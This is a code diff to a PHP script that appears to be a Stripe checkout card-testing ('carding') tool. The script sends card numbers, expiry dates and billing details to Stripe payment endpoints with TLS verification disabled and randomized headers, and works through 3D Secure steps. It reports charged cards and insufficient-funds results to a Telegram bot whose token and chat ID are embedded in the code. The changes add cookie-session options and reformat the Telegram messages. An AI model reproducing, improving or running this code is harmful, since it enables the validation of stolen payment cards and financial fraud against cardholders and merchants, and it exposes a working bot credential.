@@ -105,7 +105,7 @@ if (!empty($proxy)) {
         curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
     }
 }
-
+curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $curl_scraped_page = curl_exec($ch);
 $curl_error = curl_error($ch);
@@ -132,6 +132,7 @@ curl_setopt($ch, CURLOPT_POST, 1);
 $postfield = 'eid=NA&consent[terms_of_service]=accepted&key='.$pklive.'';
 
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
+curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
 $curl2 = curl_exec($ch);
 curl_close($ch);
@@ -150,6 +151,7 @@ curl_setopt($ch, CURLOPT_POST, 1);
 $postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]='.$full_name.'&billing_details[email]='.$xemail.'&billing_details[address][country]=US&billing_details[address][line1]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][state]='.$state.'&guid=e3180ce0-937d-41a5-a49b-34554202be6396cd52&muid=91670c3f-fc9d-417a-ad5b-55b56e3858e828a431&sid=f2b8e6cd-0795-4bcf-8439-b74dd87132b090531f&key='.$pklive.'&payment_user_agent=stripe.js%2F18b0f5a540%3B+stripe-js-v3%2F18b0f5a540%3B+checkout';
 
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
+curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
   $curl0 = curl_exec($ch);
 curl_close($ch);
@@ -174,6 +176,7 @@ curl_setopt($ch, CURLOPT_POST, 1);
 $postfield = 'eid=NA&payment_method='.$pm.'&expected_amount='.$xamount.'&last_displayed_line_item_group_details[subtotal]='.$xamount.'&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key='.$pklive.'';
 
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
+curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
  $curl1 = curl_exec($ch);
 curl_close($ch);
@@ -230,6 +233,7 @@ $postfield = 'source='.$three_d_secure_2_source.'&browser=%7B%22fingerprintAttem
 
 
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
+curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
  $result = curl_exec($ch);
 curl_close($ch);
@@ -249,6 +253,7 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
 
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
+curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
 $result1 = curl_exec($ch);
 curl_close($ch);
@@ -267,6 +272,7 @@ curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
 
 curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
+curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $randomHeaders, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
 $result2 = curl_exec($ch);
 curl_close($ch);
@@ -376,11 +382,11 @@ $botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
 $chatID = urlencode('-1001815647781');
 
 #############SEND TO TG BOT WHEN CHARGED
-$charged_message = 'Successfull%20Checkout%0A%0ABIN:%0A'.$lista.'%0A%0AURL:%0A'.urlencode($success).'%0A%0AAmount:%0A'.strtoupper($currency).'%20'.$xamount.'%0A%0AChecked_from:%0A'.$domain.'';
+$charged_message = "Successfull Checkout\r\n\nBIN:\r\n$lista\r\nSuccess URL:\r\n".urlencode($success)."\r\nAmount: ".strtoupper($currency)." $xamount\r\n\nChecked from:\r\n$domain";
 $sendcharged = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.$charged_message.'';
 
 #############SEND TO TG BOT WHEN INSUFFBAL
-$insuf_message = 'INSUFFICIENT%20FUNDS%0A%0ABIN:%0A'.$lista.'%0A%0AAmount_to_bill:%0A'.strtoupper($currency).'%20'.$xamount.'%0A%0AStripe%20Checkout%20link:%0A'.$colink.'%0A%0AChecked_from:%0A'.$domain.'';
+$insuf_message = "Insufficient Funds\r\n\nBIN: $lista\r\nAmount_to_bill:\r\n".strtoupper($currency)." $xamount\r\nAStripe%20Checkout%20link:\r\n$colink\r\n\nChecked from:\r\n$domain";
 $sendinsuff = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.$insuf_message.'';
 
 #############BOT RETRY TO SEND IF ITS NOT WORKS
